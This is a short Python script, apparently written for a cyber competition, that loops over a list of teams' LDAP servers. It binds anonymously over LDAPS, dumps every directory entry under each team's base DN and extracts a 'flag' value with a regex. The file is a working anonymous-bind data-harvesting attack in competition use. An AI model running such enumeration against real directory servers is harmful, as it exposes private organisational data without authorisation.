import ldap3
import re


ip_list = ['01','03','05','06','07','10','11','13','17','18','20','22'] # list of teams with ldap vulnerable
for i in ip_list:
    ip = f'10.0.{i}.10'#ip
    dc = f'dc=team{i},dc=ncx2022,dc=com'#dc
    print(ip, dc)#dc's flag
    server = ldap3.Server(ip, get_info = ldap3.ALL, port =636, use_ssl = True)#creating connection
    connection = ldap3.Connection(server)#same here
    if connection.bind(): # Boolean 
        if connection.search(search_base=dc,search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*'):#boolean 0010
            print(re.findall(r"intel:\s?([\w-]+)", str(connection.entries))[-1])#get flag
    else:
        continue
